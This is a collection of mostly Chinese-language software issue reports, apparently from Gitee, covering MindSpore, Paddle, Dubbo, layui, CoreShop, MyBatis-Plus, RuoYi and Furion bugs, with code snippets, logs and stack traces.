self._check_kwargs(kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 189, in _check_kwargs raise ValueError(f""The argument in 'kwargs' should be 'loss_scale_manager' or "" ValueError: The argument in 'kwargs' should be 'loss_scale_manager' or 'keep_batchnorm_fp32', but got 'acc_level'. `` ## Special notes for this issue resnet网络在ascend910或gpu环境训练失败"
Bug exists in infer_shape of graph_kernel_expander,/device gpu discussions in !16394: [GraphKernel] fix op infer for elementwise. impliment the for different formats   <code>: infer_shape
对象转Json出错,JDK1.8 hutool 4.1.13 对象转Json出错 ！！ 对象信息：（整合了lombok）   <code>: @Data @Accessors(chain = true) public class NotifyDto { private long JobId; private String notifyUrl; private String params; private Integer count; private long score; }
"[CT][MS][mobilenetV2]One commit causes mobilenetV2 not to converge, blocking progress","Hardware Environment(): /device ascend : -- MindSpore version (source): -- Python version (Python 3.7.5): -- OS platform and distribution (): -- GCC/Compiler version (7.3): mobilenetV2 net One commit causes mobilenetV2 not to converge, blocking progress Solve the convergence problem of mobilenetV2 commit deae3809690232f5f7cac7857606b9888c766ebe Merge: 5a03bd8 824bc30 Author: mindspore-ci-bot 5518576+mindspore_ci@user.noreply.gitee.com Date: Thu May 7 15:34:10 2020 +0800   <code>: !637 Learning rate and weight decay making group params Merge pull request !637 from ghzl/learning-rate-make-group-mode"
linux编译C  预测库报错,在进行linux预测库编译时报错，请问如何解决？ 按如下命令执行 执行make的时候报一下错误：   <code>: git clone https://github.com/paddlepaddle/Paddle cd Paddle git checkout release/2.0 PADDLE_ROOT=/home/wispig/inference cd Paddle mkdir build cd build cmake -DFLUID_INFERENCE_INSTALL_DIR=$PADDLE_ROOT \ -DCMAKE_BUILD_TYPE=Release \ -DWITH_PYTHON=OFF \ -DWITH_MKL=OFF \ -DWITH_GPU=OFF \ -DON_INFER=ON \ -DWITH_NCCL=OFF \ .. make [ 97%] Linking CXX shared library libpaddle_inference.so /usr/bin/ld: 找不到 ../operators/sequence_ops/libsequence_slice_op.a: T oo many open files /usr/bin/ld: 找不到 ../operators/sequence_ops/libsequence_softmax_op. a: Too many open files /usr/bin/ld: 找不到 ../operators/sequence_ops/libsequence_topk_avg_p ooling_op.a: Too many open files /usr/bin/ld: 找不到 ../operators/sequence_ops/libsequence_unpad_op.a : Too many open files /usr/bin/ld: 找不到 ../operators/amp/libcheck_finite_and_unscale_op.a: T oo many open files /usr/bin/ld: 找不到 ../operators/amp/libupdate_loss_scaling_op.a: Too many open files /usr/bin/ld: 找不到 ../operators/reader/libcreate_double_buffer_reader_ op.a: Too many open files /usr/bin/ld: 找不到 ../operators/reader/libcreate_py_reader_op.a: Too many open files /usr/bin/ld: 找不到 ../operators/reader/libreader_op_registry.a: Too ma ny open files /usr/bin/ld: 找不到 ../operators/reader/libread_op.a: Too many open fil es /usr/bin/ld: 找不到 ../operators/reader/libpy_reader.a: Too many open files /usr/bin/ld: 找不到 /usr/lib/gcc/x86_64-linux-gnu/7/../../../x86_64-linux-g nu/crtn.o: Too many open files collect2: error: ld returned 1 exit status paddle/fluid/inference/CMakeFiles/paddle_inference_shared.dir/build. make:1711: recipe for target 'paddle/fluid/inference/libpaddle_inferenc e.so' failed make[2]: *** [paddle/fluid/inference/libpaddle_inference.so] Error 1 CMakeFiles/Makefile2:78651: recipe for target 'paddle/fluid/inference/ CMakeFiles/paddle_inference_shared.dir/all' failed make[1]: *** [paddle/fluid/inference/CMakeFiles/paddle_inference_shar ed.dir/all] Error 2 Makefile:129: recipe for target 'all' failed make: *** [all] Error 2
Dubbo 2.7.7版本Invocation的attachments会被RpcContext的attachments覆盖,"Dubbo 2.7.7版本Invocation的attachments会被RpcContext的attachments覆盖 ServiceA-&gt;ServiceB-&gt;ServiceC SericeC由于attachments被覆盖 所以导致拿到的是ServiceA的数据 duboo2.7.7 由上述代码可以看出invocation的Attachments会被RpcContext的Attachments覆盖 duboo2.6.2   <code>: public abstract class AbstractInvoker&lt;T&gt; implements Invoker&lt;T&gt; { public Result invoke(Invocation inv) throws RpcException { //省略代码 Map&lt;String, Object&gt; contextAttachments = RpcContext.getContext().getObjectAttachments(); if (CollectionUtils.isNotEmptyMap(contextAttachments)) { /** * invocation.addAttachmentsIfAbsent(context){@link RpcInvocation#addAttachmentsIfAbsent(Map)}should not be used here, * because the {@link RpcContext#setAttachment(String, String)} is passed in the Filter when the call is triggered * by the built-in retry mechanism of the Dubbo. The attachment to update RpcContext will no longer work, which is * a mistake in most cases (for example, through Filter to RpcContext output traceId and spanId and other information). */ invocation.addObjectAttachments(contextAttachments); } //省略 } } public abstract class AbstractInvoker&lt;T&gt; implements Invoker&lt;T&gt; { public Result invoke(Invocation inv) throws RpcException { //省略代码 RpcInvocation invocation = (RpcInvocation) inv; invocation.setInvoker(this); if (attachment != null &amp;&amp; attachment.size() &gt; 0) { invocation.addAttachmentsIfAbsent(attachment); } Map&lt;String, String&gt; context = RpcContext.getContext().getAttachments(); if (context != null) { invocation.addAttachmentsIfAbsent(context); } //省略代码 } }"
【众智】【数据算子】FashionMnistDataset,"Customer's Demands on Product/Solution Gaps to Fill on Product/Solution Preliminary Discussion Acceptance Standards Requirement Value Description 算子分析 Fashion-MNIST是一个替代MNIST手写数字集的图像数据集。其涵盖了来自10种类别的共7万个不同商品的正面图片。Fashion-MNIST的大小、格式和训练集/测试集划分与原始的MNIST一致。60000/10000的训练测试数据划分，28x28的灰度图片。 下载地址：https://github.com/zalandoresearch/fashion-mnist python层接口 dataset_dir str 数据集文件路径 usage str 数据集类型， 可为 ‘train’, ‘test’ 或 ‘all’ num_samples int 读取的数据样本数量 num_parallel_workers int 用于读取数据的线程数 shuffle bool 是否随机打乱数据顺序 sampler Sampler 用于进行数据采样的采样器对象 num_shards int 数据分片数量 shard_id int 分片号 cache DatasetCache 用于进行数据缓存的缓存对象 C++层接口 dataset_dir str 数据集文件路径 usage str 数据集类型， 可为 ‘train’, ‘test’ 或 ‘all’ sampler Sampler 用于进行数据采样的采样器对象 cache DatasetCache 用于进行数据缓存的缓存对象   <code>: class mindspore.dataset.FashionMnistDataset(dataset_dir, usage=‘all’, num_samples=None, num_parallel_workers=None, shuffle=None, sampler=None, num_shards=None, shard_id=None, cache=None) inline std::shared_ptr&lt;FashionMnistDataset&gt; FashionMnist( const std::string &amp;dataset_dir, const std::string &amp;usage = ""all"", const std::shared_ptr&lt;Sampler&gt; &amp;sampler = std::make_shared&lt;RandomSampler&gt;(), const std::shared_ptr&lt;DatasetCache&gt; &amp;cache = nullptr) inline std::shared_ptr&lt;FashionMnistDataset&gt; FashionMnist( const std::string &amp;dataset_dir, const std::string &amp;usage, const Sampler *sampler, const std::shared_ptr&lt;DatasetCache&gt; &amp;cache = nullptr) inline std::shared_ptr&lt;FashionMnistDataset&gt; FashionMnist( const std::string &amp;dataset_dir, const std::string &amp;usage, const std::reference_wrapper&lt;Sampler&gt; sampler, const std::shared_ptr&lt;DatasetCache&gt; &amp;cache = nullptr)"
全模块用法时面包屑无法显示,"如题，好像面包屑模块没有运行，重现问题的代码如下： 不知是我哪里用法不对还是layui.all.js 本身有BUG，版本是layui-v2.5.7   <code>: &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;TEST&lt;/title&gt; &lt;meta charset=""utf-8""&gt; &lt;link rel=""stylesheet"" href=""static/layui/css/layui.css?v=20201127000231""&gt; &lt;script src=""/static/layui/layui.all.js?v=20201230130711""&gt;&lt;/script&gt; &lt;/head&gt; &lt;body class=""layui-layout-body""&gt; &lt;span class=""layui-breadcrumb"" lay-separator=""-""&gt; &lt;a href=""""&gt;首页&lt;/a&gt; &lt;a href=""""&gt;国际新闻&lt;/a&gt; &lt;a href=""""&gt;亚太地区&lt;/a&gt; &lt;a&gt;&lt;cite&gt;正文&lt;/cite&gt;&lt;/a&gt; &lt;/span&gt; &lt;/body&gt; &lt;/html&gt;"
数据表格的重载没作用,"网页看起来能正常运行，但是我粘贴代码下来修改后却没作用   <code>: &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=""utf-8""&gt; &lt;title&gt;Layui&lt;/title&gt; &lt;meta name=""renderer"" content=""webkit""&gt; &lt;meta http-equiv=""X-UA-Compatible"" content=""IE=edge,chrome=1""&gt; &lt;meta name=""viewport"" content=""width=device-width, initial-scale=1, maximum-scale=1""&gt; &lt;link rel=""stylesheet"" href=""../lib/layui-v2.6.4/css/layui.css"" media=""all""&gt; &lt;!-- 注意：如果你直接复制所有代码到本地，上述css路径需要改成你本地的 --&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=""demoTable""&gt; 搜索ID： &lt;div class=""layui-inline""&gt; &lt;input class=""layui-input"" name=""id"" id=""demoReload"" autocomplete=""off""&gt; &lt;/div&gt; &lt;button class=""layui-btn"" data-type=""reload""&gt;搜索&lt;/button&gt; &lt;/div&gt; &lt;table class=""layui-hide"" id=""LAY_table_user"" lay-filter=""user""&gt;&lt;/table&gt; &lt;script src=""../lib/layui-v2.6.4/layui.js"" charset=""utf-8""&gt;&lt;/script&gt; &lt;!-- 注意：如果你直接复制所有代码到本地，上述 JS 路径需要改成你本地的 --&gt; &lt;script&gt; layui.use('table', function(){ var table = layui.table; //方法级渲染 table.render({ elem: '#LAY_table_user' ,url: '../api/table.json' ,cols: [[ {checkbox: true, fixed: true} ,{field:'id', title: 'ID', width:80, sort: true, fixed: true} ,{field:'username', title: '用户名', width:80} ,{field:'sex', title: '性别', width:80, sort: true} ,{field:'city', title: '城市', width:80} ,{field:'sign', title: '签名'} ,{field:'experience', title: '积分', sort: true, width:80} ,{field:'score', title: '评分', sort: true, width:80} ,{field:'classify', title: '职业', width:80} ,{field:'wealth', title: '财富', sort: true, width:135} ]] ,id: 'testReload' ,page: true }); var $ = layui.$, active = { reload: function(){ var demoReload = $('#demoReload'); //执行重载 table.reload('testReload', { page: { curr: 1 //重新从第 1 页开始 } ,where: { key: { id: demoReload.val() } } }); } }; $('.demoTable .layui-btn').on('click', function(){ var type = $(this).data('type'); active[type] ? active[type].call(this) : ''; }); }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;"
前端按钮，弹出层，求大佬进来瞅瞅帮忙解决下,"""<i></i>审核 "");   <code>: var more3 = []; more3.push(""&lt;a class='btn btn-success btn-xs "" + designer_followHistoryFlag + ""' href='javascript:void(0)' onclick=open_designer_follow_history('"" + row.customerId + ""')&gt;&lt;i class='fa fa-search'&gt;"" + ""&lt;/i&gt;跟进记录&lt;/a&gt; ""); more3.push(""&lt;a class='btn btn-success btn-xs "" + followHistoryFlag + ""' href='javascript:void(0)' onclick=open_follow_history('"" + row.customerId + ""')&gt;&lt;i class='fa fa-search'&gt;"" + ""&lt;/i&gt;销售跟进记录&lt;/a&gt;""); actions.push('&lt;a tabindex=""0"" class=""btn btn-success btn-xs"" role=""button"" data-container=""body"" data-placement=""left"" data-toggle=""popover"" data-html=""true"" data-trigger=""hover"" data-content=""' + more1.join('') + '""&gt;' + '&lt;i class=""fa fa-chevron-circle-right""&gt;&lt;/i&gt;更多操作&lt;/a&gt; '); actions.push('&lt;a tabindex=""0"" class=""btn btn-info btn-xs"" role=""button"" data-container=""body"" data-placement=""left"" data-toggle=""popover"" data-html=""true"" data-trigger=""hover"" data-content=""' + more3.join('') + '""&gt;' + '&lt;i class=""fa fa-chevron-circle-right""&gt;&lt;/i&gt;跟进记录&lt;/a&gt; '); return actions.join('');"
Temporally disable rpc_server_test ,"prevents this PR(#12369:咨询：Warning求解), so I temporally disable it. @Yancey will help to enable it later.   <code>: rpc_server_test"
TestCase fails to Task err When the dump function is enabled,": /device ascend /device gpu /device cpu : -- MindSpore version : master -- Python version : -- OS platform and distribution : -- GCC/Compiler version : Download &amp; Compile master code Enabel dump function run testcase Disable Dump func, the testcase is ok. Enable Dump func, the testcase fails to tast err. testcase is ok when the dump func is enabled.   <code>: from mindspore import Tensor import numpy as np import mindspore.ops.operations as P import mindspore.nn as nn import mindspore.ops as ops from mindspore import context class ControlOneWhileAndOneAddn(nn.Cell): def __init__(self): super().__init__() self.addn = P.AddN() def construct(self, x, y, z, input): out = input while((x &gt; y) and (y&gt;z)): # loop = 3 out = self.addn([out, input, input]) z = z + 1 return out # out = 7 * input class Grad(nn.Cell): def __init__(self, network): super(Grad, self).__init__() self.grad = ops.GradOperation(get_all=True) self.network = network def construct(self, x, y, z, input_x): return self.grad(self.network)(x, y, z, input_x) # grad = 7 if __name__ == '__main__': context.set_context(mode=context.GRAPH_MODE) x = np.array(10).astype(np.float32) y = np.array(7).astype(np.float32) z = np.array(4).astype(np.float32) #input = np.array(1).astype(np.float32) input_shape = (128, ) input = np.random.randn(*input_shape).astype(np.float32) net = ControlOneWhileAndOneAddn() #out_me = net(Tensor(x), Tensor(y), Tensor(z), Tensor(input)) grad_net = Grad(net) grad = grad_net(Tensor(x), Tensor(y), Tensor(z), Tensor(input)) print(""============output: "", grad) [INFO] RUNTIME(80844,python):2021-06-26-14:44:46.958.934 [task.cc:2133] 80892 SetResult: payLoad=935338129, highTaskId=0, errorCode=0x91, errorTaskId=223, errorStreamId=2 [ERROR] RUNTIME(80844,python):2021-06-26-14:44:46.958.957 [engine.cc:927]80892 ReportExceptProc:Task exception! device_id=0, stream_id=14, task_id=1, type=13, retCode=0x91. [INFO] RUNTIME(80844,python):2021-06-26-14:44:46.958.970 [device_error_proc.cc:554] 80892 ProcErrorInfo: Begin to process device error info. [INFO] RUNTIME(80844,python):2021-06-26-14:44:46.959.070 [device_error_proc.cc:500] 80892 ProcessOneElementInRingBuffer: it needs process 1 error messages. [ERROR] RUNTIME(80844,python):2021-06-26-14:44:46.959.085 [device_error_proc.cc:489]80892 ProcessAicpuErrorInfo:An exception occurred during AICPU execution, stream_id:2, task_id:223, errcode:21002, msg:dump failed [INFO] RUNTIME(80844,python):2021-06-26-14:44:46.959.095 [device_error_proc.cc:594] 80892 ProcErrorInfo: finished to process device error info, retCode=0. [INFO] RUNTIME(80844,python):2021-06-26-14:44:46.959.102 [engine.cc:938] 80892 ReportExceptProc: excptCallBack_ is null. [INFO] RUNTIME(80844,python):2021-06-26-14:44:46.959.109 [stream.cc:909] 80892 TryDelRecordedTask: del public task from stream, stream_id=14, tailTaskId=1, delTaskId=1, head=2, tail=3 [INFO] RUNTIME(80844,python):2021-06-26-14:44:46.959.118 [logger.cc:1359] 80892 TaskFinished: device_id=0, stream_id=14, task_id=1, task_type=13,task_finish_num=492 [ERROR] RUNTIME(80844,python):2021-06-26-14:44:46.971.766 [task.cc:691]80892 PrintErrorInfo:Aicore kernel execute failed, device_id=0, stream_id=2, report_stream_id=14, task_id=223, fault kernel_name=AddN_1505871480408552453_0__kernel0, func_name=AddN_1505871480408552453_0__kernel0, program id=9, hash=9444965564484115196. [ERROR] RUNTIME(80844,python):2021-06-26-14:44:46.971.787 [task.cc:2175]80892 ReportErrorInfo:model execute error, retCode=0x91, [the model stream execute failed]. [ERROR] RUNTIME(80844,python):2021-06-26-14:44:46.971.796 [task.cc:2157]80892 PrintErrorInfo:model execute task failed, device_id=0, model stream_id=14, model task_id=1, model_id=1, first_task_id=65535 [INFO] RUNTIME(80844,python):2021-06-26-14:44:46.971.810 [task.cc:100] 80892 TaskFailCallBack: rtCode=0x7150050,[the model stream execute failed], errorTaskId=223, errorStreamId=2 [INFO] RUNTIME(80844,python):2021-06-26-14:44:46.971.858 [engine.cc:617] 80892 ProcessTaskReport: RTS_DRIVER: report receive, stream_id=14, sq_id=25, task_id=2, sq_head=3. [INFO] RUNTIME(80844,python):2021-06-26-14:44:46.971.871 [engine.cc:617] 80892 ProcessTaskReport: RTS_DRIVER: report receive, stream_id=14, sq_id=25, task_id=2, sq_head=3. [INFO] RUNTIME(80844,python):2021-06-26-14:44:46.971.881 [stream.cc:909] 80892 TryDelRecordedTask: del public task from stream, stream_id=14, tailTaskId=2, delTaskId=2, head=3, tail=3 [INFO] RUNTIME(80844,python):2021-06-26-14:44:46.971.890 [logger.cc:1359] 80892 TaskFinished: device_id=0, stream_id=14, task_id=2, task_type=2,task_finish_num=493 [ERROR] RUNTIME(80844,python):2021-06-26-14:44:46.971.923 [stream.cc:688]80902 GetError:Stream Synchronize failed, stream=14 retCode=0x91, [the model stream execute failed]. [ERROR] RUNTIME(80844,python):2021-06-26-14:44:46.972.019 [logger.cc:271]80902 StreamSynchronize:Stream synchronize failed, stream = 0xfffeb0657d70 [INFO] RUNTIME(80844,python):2021-06-26-14:44:46.972.019 [npu_driver.cc:387] 80891 CommandOccupy: sqId=35, deviceId=0, tsId=0, command=0xf0000230300, cmdCount=1. [INFO] RUNTIME(80844,python):2021-06-26-14:44:46.972.042 [engine.cc:806] 80891 SendingRun: CommandOccupy. sqId=35, cqId=1, deviceId=0, retCode=0. [INFO] RUNTIME(80844,python):2021-06-26-14:44:46.972.052 [stream.cc:867] 80891 AddTaskToStream: recorded public task to stream, stream_id=1, task_id=12, task_type=6, head=12, tail=13 [INFO] RUNTIME(80844,python):2021-06-26-14:44:46.972.059 [logger.cc:1348] 80891 TaskLaunchedEx: device_id=0, stream_id=1, task_id=12, task_type=6,task_launched_num=494 [ERROR] RUNTIME(80844,python):2021-06-26-14:44:46.972.059 [api_c.cc:505]80902 rtStreamSynchronize:ErrCode=507011, desc=[the model stream execute failed], InnerCode=0x7150050 [INFO] RUNTIME(80844,python):2021-06-26-14:44:46.972.072 [npu_driver.cc:413] 80891 CommandSend: Command send success, device_id=0, ts_id=0, sq_id=35, reportCount=1, command=0xf0000230300, cmdCount=1. [ERROR] RUNTIME(80844,python):2021-06-26-14:44:46.972.087 [error_message_manage.cc:26]80902 ReportFuncErrorReason:rtStreamSynchronize execute failed, reason=[the model stream execute failed] [ERROR] GE(80844,fffee77fe1e0,python):2021-06-26-14:44:46.972.152 [mindspore/ccsrc/runtime/device/ascend/ge_runtime/runtime_model.cc:231] Run] Call rt api rtStreamSynchronize failed, ret: 507011 [INFO] RUNTIME(80844,python):2021-06-26-14:44:46.972.184 [engine.cc:617] 80892 ProcessTaskReport: RTS_DRIVER: report receive, stream_id=1, sq_id=35, task_id=12, sq_head=13. [INFO] RUNTIME(80844,python):2021-06-26-14:44:46.972.195 [stream.cc:909] 80892 TryDelRecordedTask: del public task from stream, stream_id=1, tailTaskId=12, delTaskId=12, head=13, tail=13 [INFO] RUNTIME(80844,python):2021-06-26-14:44:46.972.203 [logger.cc:1359] 80892 TaskFinished: device_id=0, stream_id=1, task_id=12, task_type=6,task_finish_num=494 [INFO] DEBUG(80844,fffee77fe1e0,python):2021-06-26-14:44:46.972.207 [mindspore/ccsrc/debug/trace.cc:501] GetEvalStackInfo] Get graph analysis information begin [INFO] DEBUG(80844,fffee77fe1e0,python):2021-06-26-14:44:46.972.236 [mindspore/ccsrc/debug/trace.cc:504] GetEvalStackInfo] Length of analysis information stack is empty. [ERROR] DEVICE(80844,fffee77fe1e0,python):2021-06-26-14:44:46.972.490 [mindspore/ccsrc/runtime/device/ascend/ascend_kernel_runtime.cc:570] DumpTaskExceptionInfo] Task fail infos task_id: 223, stream_id: 2, tid: 80902, device_id: 0, retcode: 507011 [INFO] ASCENDCL(80844,python):2021-06-26-14:44:47.014.164 [tensor_data_transfer.cpp:439]80902 acltdtStopChannel: start to acltdtStopChannel, device is 0, name is TF_RECEIVE__npu_log [INFO] TDT(80844,python):2021-06-26-14:44:47.014.211 [log.cpp:157]begin tdt host stop, …… Traceback (most recent call last): File ""test.py"", line 41, in &lt;module&gt; grad = grad_net(Tensor(x), Tensor(y), Tensor(z), Tensor(input)) File ""/home/users/lzlang/code/master_ms/mindspore/build/package/mindspore/nn/cell.py"", line 367, in __call__ out = self.compile_and_run(*inputs) File ""/home/users/lzlang/code/master_ms/mindspore/build/package/mindspore/nn/cell.py"", line 641, in compile_and_run return _executor(self, *new_inputs, phase=self.phase) File ""/home/users/lzlang/code/master_ms/mindspore/build/package/mindspore/common/api.py"", line 611, in __call__ return self.run(obj, *args, phase=phase) File ""/home/users/lzlang/code/master_ms/mindspore/build/package/mindspore/common/api.py"", line 639, in run return self._exec_pip(obj, *args, phase=phase_real) File ""/home/users/lzlang/code/master_ms/mindspore/build/package/mindspore/common/api.py"", line 75, in wrapper results = fn(*arg, **kwargs) File ""/home/users/lzlang/code/master_ms/mindspore/build/package/mindspore/common/api.py"", line 622, in _exec_pip return self._executor(args_list, phase) RuntimeError: mindspore/ccsrc/backend/session/ascend_session.cc:1146 Execute] run task error!"
代码重复,"index.js   <code>: $(function() { // MetsiMenu $('#side-menu').metisMenu(); // 固定菜单栏 $(function() { //----------------------------------------此行多余代码 $('.sidebar-collapse').slimScroll({ height: '96%', railOpacity: 0.9, alwaysVisible: false }); });//----------------------------------------此行多余代码 。。。。。。。。省略一万行 });"
点击财务收款报错,"mysql数据库下启动后台管理系统 使用刚down的完整数据库：coreshopmysql20210610带演示数据.sql 点击页面菜单：财务收款 异常提示：   <code>: 序列 7 时间 2021-06-16 10:04:15 级别 Error 事件日志上下文 Web 记录器名字 logdb 消息 全局捕获异常 名称 DULING ip ::1 请求方式 POST 请求地址 http://localhost/Api/CoreCmsReports/GetPayments 是否授权 1 授权类型 AuthenticationTypes.Federation 身份认证 coreshop 异常信息 MySql.Data.MySqlClient.MySqlException (0x80004005): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ':=1+1 as x from (SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION S' at line 3 at SqlSugar.AdoProvider.GetDataReader(String sql, SugarParameter[] parameters) at SqlSugar.AdoProvider.SqlQuery[T,T2,T3,T4,T5,T6,T7](String sql, Object parameters) at SqlSugar.AdoProvider.SqlQuery[T](String sql, SugarParameter[] parameters) at SqlSugar.AdoProvider.SqlQuery[T](String sql, List`1 parameters) at CoreCms.Net.Repository.BaseRepository`1.SqlQuery(String sql, List`1 parameters) in E:\github\coreShop\CoreShop\CoreCms.Net.Repository\BaseRepository.cs:line 1287 at CoreCms.Net.Services.CoreCmsReportsServices.GetTocashMark(Int32 num, String where, Int32 section, DateTime sTime, String joinVal) in E:\github\coreShop\CoreShop\CoreCms.Net.Services\Financial\CoreCmsReportsServices.cs:line 282 at CoreCms.Net.Web.Admin.Controllers.Content.CoreCmsReportsController.GetPayments(FMReports entity) in E:\github\coreShop\CoreShop\CoreCms.Net.Web.Admin\Controllers\Reports\CoreCmsReportsController.cs:line 255 at lambda_method2186(Closure , Object , Object[] ) at Microsoft.AspNetCore.Mvc.Infrastructure.ActionMethodExecutor.SyncActionResultExecutor.Execute(IActionResultTypeMapper mapper, ObjectMethodExecutor executor, Object controller, Object[] arguments) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.InvokeActionMethodAsync() at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Next(State&amp; next, Scope&amp; scope, Object&amp; state, Boolean&amp; isCompleted) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.InvokeNextActionFilterAsync() --- End of stack trace from previous location --- at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Rethrow(ActionExecutedContextSealed context) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Next(State&amp; next, Scope&amp; scope, Object&amp; state, Boolean&amp; isCompleted) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.InvokeInnerFilterAsync() --- End of stack trace from previous location --- at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.g__Awaited|25_0(ResourceInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)"
查询动态表名能利用Wrapper么？,"因为使用了wrapper，所以那个表名的地方不知道怎样传递了   <code>: &lt;select id=""sumMileage"" resultType=""double""&gt; SELECT SUM(mileage) FROM 这里需要动态传递表名 AS d JOIN business_info AS b ON d.did = b.did &lt;where&gt; ${ew.sqlSegment} &lt;/where&gt; &lt;/select&gt;"
[CT][MS][Dropout2d]Performance comparison failed at cpu and gpu,"cpu 和 gpu后端， 性能与标杆对比不达标 / 硬件环境: /device GPU/CPU : -- MindSpore version :master -- Python version :3.7.5 -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph 图模式下执行测试用例 执行结果与标杆对比通过， 性能达标   <code>: def test_dropout2d_op_500_performance(): input_x = Tensor(np.random.randn(500, 10, 10, 10).astype(np.float32)) fact = Dropout2DMock(inputs=[input_x]) fact.forward_profile_cmp() def test_dropout2d_op_1000_performance(): input_x = Tensor(np.random.randn(1000, 10, 10, 10).astype(np.float32)) fact = Dropout2DMock(inputs=[input_x]) fact.forward_profile_cmp() def test_dropout2d_op_500_performance(): input_x = Tensor(np.random.randn(500, 10, 10, 10).astype(np.float32)) fact = Dropout2DMock(inputs=[input_x]) &gt; fact.forward_profile_cmp() self = Dropout2DMock&lt;&gt; def forward_profile_cmp(self): net = Dropout2D(self.keep_prob) for _ in range(20): net(self.input_x) ms_op_name = ""Dropout2D"" profile_ms = self.mindspore_profile(net, 40, ms_op_name, self.input_x) torch_op = torch.nn.Dropout2d(p=self.keep_prob) torch_op_name = ""aten::feature_dropout"" profile_torch = self.pytorch_forward_profile(torch_op, 40, torch_op_name, torch.from_numpy(self.input_x_np)) logger.info(""mindspore time: {}"".format(profile_ms)) logger.info(""torch time: {}"".format(profile_torch)) &gt; assert profile_torch &gt;= 0.9 * profile_ms E AssertionError ../share/ops/primitive/dropout2d_ops.py:188: AssertionError [INFO] ME(17690:140432902391616,MainProcess):2022-07-07-11:37:10.415.111 [/home/caory/MindSporeTest/share/ops/primitive/dropout2d_ops.py:186] mindspore time: 20.6413 [INFO] ME(17690:140432902391616,MainProcess):2022-07-07-11:37:10.415.233 [/home/caory/MindSporeTest/share/ops/primitive/dropout2d_ops.py:187] torch time: 15.625 def test_dropout2d_op_1000_performance(): input_x = Tensor(np.random.randn(1000, 10, 10, 10).astype(np.float32)) fact = Dropout2DMock(inputs=[input_x]) &gt; fact.forward_profile_cmp() test_dropout2d.py:327: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = Dropout2DMock&lt;&gt; def forward_profile_cmp(self): net = Dropout2D(self.keep_prob) for _ in range(20): net(self.input_x) ms_op_name = ""Dropout2D"" profile_ms = self.mindspore_profile(net, 40, ms_op_name, self.input_x) torch_op = torch.nn.Dropout2d(p=self.keep_prob) torch_op_name = ""aten::feature_dropout"" profile_torch = self.pytorch_forward_profile(torch_op, 40, torch_op_name, torch.from_numpy(self.input_x_np)) logger.info(""mindspore time: {}"".format(profile_ms)) logger.info(""torch time: {}"".format(profile_torch)) &gt; assert profile_torch &gt;= 0.9 * profile_ms E AssertionError [INFO] ME(22452:140655218661184,MainProcess):2022-07-07-11:40:42.915.01 [/home/caory/MindSporeTest/share/ops/primitive/dropout2d_ops.py:186] mindspore time: 33.2848 [INFO] ME(22452:140655218661184,MainProcess):2022-07-07-11:40:42.916.12 [/home/caory/MindSporeTest/share/ops/primitive/dropout2d_ops.py:187] torch time: 26.2"
若依 shiro 提供无需要登陆，也可访问提供数据的接口,"若依 shiro 提供无需要登陆，也可访问提供数据的接口 需求描述： 若依控制器Controller下的方法 去掉了@RequiresPermissions(""job:recruit:list"") ，如果退出用户，直接访问url路径 则会跳转到登陆页面   <code>: //如下要求权限限制 @RequiresPermissions(""job:recruit:list"") @GetMapping(""/listTest"") @ResponseBody public TableDataInfo list(TdRecruit tdRecruit) { startPage(); List&lt;TdRecruit&gt; list = tdRecruitService.selectTdRecruitList(tdRecruit); return getDataTable(list); }"
RemoteRequest远程请求异常拦截增加对网络异常的拦截功能,"Furion 版本号 2.11.0 Web 项目类型 WebApi Mvc Razor Pages Blazor Server RemoteRequest在添加OnException异常拦截器之后，远程主机不在线时抛出的异常未能拦截 代码或代码仓库 Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos OnException可以将远程主机不在线的异常拦截，由使用者在拦截方法中自定义返回信息   <code>: 由于连接方在一段时间后没有正确答复或连接的主机没有反应，连接尝试失败。 at System.Net.Sockets.Socket.AwaitableSocketAsyncEventArgs.ThrowException(SocketError error, CancellationToken cancellationToken) at System.Net.Sockets.Socket.AwaitableSocketAsyncEventArgs.System.Threading.Tasks.Sources.IValueTaskSource.GetResult(Int16 token) at System.Net.Sockets.Socket.&lt;&lt;ConnectAsync&gt;g__WaitForConnectWithCancellation|283_0&gt;d.MoveNext() at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw() at System.Runtime.CompilerServices.TaskAwaiter.ThrowForNonSuccess(Task task) at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task) at System.Net.Http.HttpConnectionPool.&lt;DefaultConnectAsync&gt;d__83.MoveNext() at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw() at System.Runtime.CompilerServices.TaskAwaiter.ThrowForNonSuccess(Task task) at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task) at System.Threading.Tasks.ValueTask`1.get_Result() at System.Runtime.CompilerServices.ConfiguredValueTaskAwaitable`1.ConfiguredValueTaskAwaiter.GetResult() at System.Net.Http.ConnectHelper.&lt;ConnectAsync&gt;d__1.MoveNext() try { var response = await ""http://134.135.136.137/test"".OnException((res, errors) =&gt; { Console.WriteLine(errors); }).GetAsStringAsync(); Console.WriteLine(response); } catch (Exception ex) { Console.WriteLine(ex.Message); }"
